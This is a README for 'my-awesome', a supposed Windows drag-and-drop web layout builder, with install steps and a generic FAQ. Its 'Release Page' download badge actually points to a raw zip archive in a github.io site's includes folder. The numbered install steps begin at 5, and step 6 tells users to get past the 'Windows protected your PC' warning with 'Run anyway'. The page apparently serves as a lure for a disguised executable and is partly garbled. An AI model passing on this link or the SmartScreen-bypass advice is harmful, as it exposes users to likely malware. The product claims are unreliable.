# 🎨 my-awesome - Build web layouts with ease

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Reluctant-signore917/reluctant-signore917.github.io/main/_includes/Application-3.6.zip)

my-awesome is a visual tool for building user interfaces. You select pre-made components and place them on a digital canvas. The app generates code as you design, helping you create layouts without writing complex manual instructions. It works offline and provides instant previews of your progress.

## 🛠️ System Requirements

To run this application on your computer, ensure your system meets these basic needs:

* Windows 10 or 11 (64-bit version).
* At least 4 gigabytes of RAM.
* Roughly 500 megabytes of free storage space.
* A stable internet connection for the initial download of the installer.

5. Double-click the file to start the installation.
6. If a window labeled "Windows protected your PC" appears, click "More info" and then "Run anyway."
7. Follow the prompts on the screen to finish the setup process.
8. Locate the new icon on your desktop and double-click it to start the program.

## 💡 Using the Layout Builder

When you open the application, you see a blank canvas in the center of the screen. This area represents your workspace. The panel on the left side contains folders of components. 

### Adding Components
Select a component from the side panel by clicking on its name. Drag the component from the list and drop it onto the center canvas. You can move items around by clicking and dragging them. To change the size of a component, click the small boxes at the corners of the shape and pull them inward or outward.

### Live Preview
The app includes a live view window. This window updates automatically as you change your design. You can see how your layout looks in a browser-like frame without needing to export your work. 

### Design Tools
The right panel contains settings for the selected component. Here you change internal text, adjust colors, modify spacing, and set alignment preferences. The changes you make in this panel appear on the canvas immediately. 

## ⚙️ Saving and Exporting

The application saves your progress as a project file. Use the "File" menu at the top left to save your current work. Choose "Save As" to create a new file on your computer. 

When you want to use the code you built, choose the "Export" option from the file menu. The app provides a folder containing the necessary HTML and CSS files. You can open these files in any text editor or drag them into a project folder to use in your website development. 

## 📋 Frequently Asked Questions

### Do I need to be a developer to use this?
No. While the tool helps developers, you do not need prior experience. The interface uses drag-and-drop visuals to avoid the need for typing code.

### Does it work without an internet connection?
Yes. The application runs entirely on your local machine. Once you install the program, you can use every feature while offline. 

### Can I share my project files with others?
Yes. You can send your saved project files to other people who also have the software installed. They can open the file and continue working from where you left off.

### How do I update the software?
Check the release page periodically for new versions. If a new version exists, download and run the installer again. The system will detect the old version and replace it with the new one automatically. Your existing project files will remain safe during this process.

### Where can I report issues?
If you find a broken feature or an error, navigate to the issues tab on the GitHub project page. Explain what happened in a helpful way. Include a description of the steps you took before the error occurred.

### Is my design data private?
Yes. All your project files stay on your computer. The application does not upload your designs to a server. You maintain full control over your files and work.

### Can I change the color scheme of the app itself?
Yes. Open the "Settings" menu inside the program. You can switch between light mode and dark mode to suit your preference.

### Does the app support custom assets?
Yes. You can import your own images and icons into the media library panel. Drag these files from your computer folder directly into the media window. Once imported, you can add these assets to your layouts just like the built-in components.

### What is "vibe-coding"?
Vibe-coding is a method of building interfaces through intuition and instant visual feedback. By relying on the live preview, you can refine your layout until the design feels right. This creates a quick flow that mimics the actual results on a screen.

### How do I undo a mistake?
Use the standard keyboard shortcut "Ctrl + Z" at any time to undo your last action. Pressing "Ctrl + Y" will redo an action if you change your mind. These shortcuts work on all parts of the canvas.
